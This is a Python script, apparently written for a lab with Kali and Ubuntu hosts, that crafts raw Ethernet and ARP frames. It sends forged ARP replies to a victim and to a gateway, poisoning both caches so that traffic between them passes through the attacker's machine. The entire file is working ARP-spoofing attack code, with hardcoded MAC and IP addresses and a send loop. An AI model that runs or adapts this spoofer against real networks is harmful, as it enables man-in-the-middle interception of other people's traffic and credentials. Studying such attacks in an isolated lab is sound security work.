import socket
import struct
import binascii

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket. htons(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

MAC_Attacker = b'\x00\x50\x56\xC0\x00\x08'  #input("MAC address ATTACKER (ex \\x00\\x0c\\x29\\x4f\\x8e\\x76): ") # \x00\x0C\x29\x7F\x05\x7D (Kali Linux)
MAC_Victim = b'\x00\x0C\x29\x7F\x05\x7D'  #input("MAC address VICTIM (ex \\x00\\x0C\\x29\\x2E\\x84\\x5A): ") # \x00\x0C\x29\xEA\x26\x44 (Ubuntu Victim)
MAC_Gateway = b'\x00\x0C\x29\xEA\x26\x44'  #input("MAC address GATEWAY (ex \\x00\\x50\\x56\\xC0\\x00\\x28): ") # \xD8\xF2\xCA\xB5\x33\x4E (Wi-Fi Windows10)
# print("[+] Type MAC Attacker: ", type(MAC_Attacker))
print("[+] MAC address Attacker: ", MAC_Attacker)
print("[+] MAC address Gateway: ", MAC_Gateway)
print("[+] MAC address Victim: ", MAC_Victim)

code =b'\x08\x06'  #Address Resolution Protocol (ARP)

ethernet1 = MAC_Victim + MAC_Attacker + code
ethernet2 = MAC_Gateway +  MAC_Attacker + code
print("[+] Type Ethernet 1: ", type(ethernet1))
print("[+] Type Ethernet 2: ", type(ethernet2))

HTYPE = b'\x00\x01' 	# Hardware Type (HTYPE) == Ethernet
PTYPE = b'\x08\x00' 	# PTYPE (Protocol Type) == IPv4
HLEN = b'\x06' 	# HLEN (Hardware Length) == 6(Ethernet)
PLEN = b'\x04' 	# PLEN (Protocol Length) == 4(IPv4)
OPER = b'\x00\x02' 	# OPER (Operation) == 2(ARP Reply)
print("[+] Type Hardware Type: ", type(HTYPE))

gateway_ip = '20.20.20.20' #input("IP address GATEWAY (ex 192.168.43.85): " )
victim_ip = '20.20.20.24' #input("IP address VICTIM (ex 192.168.43.131): " )

IP_Gateway = socket.inet_aton ( gateway_ip )
IP_Victim = socket.inet_aton ( victim_ip )
# print("[+] Type IP Gateway: ",type(IP_Gateway))
# print("[+] Type IP Victim: ", type(IP_Victim))
print("[+] IP Gateway: ", IP_Gateway)
print("[+] IP Victim: ", IP_Victim)


ARP_Victim = struct.pack("!14s2s2s1s1s2s6s4s6s4s", ethernet1, HTYPE, PTYPE, HLEN, PLEN, OPER, MAC_Attacker, IP_Gateway, MAC_Victim, IP_Victim)
ARP_Gateway = struct.pack("!14s2s2s1s1s2s6s4s6s4s", ethernet2, HTYPE, PTYPE, HLEN, PLEN, OPER, MAC_Attacker, IP_Victim, MAC_Gateway, IP_Gateway)

print("[+] ARP Victim: ", type(ARP_Victim))
print("[+] ARP Gateway: ", type(ARP_Gateway))

x = 5
while x:
	s.send(ARP_Victim)
	s.send(ARP_Gateway)
	x -= 1

print("==================================== FINISHED!!! ====================================")
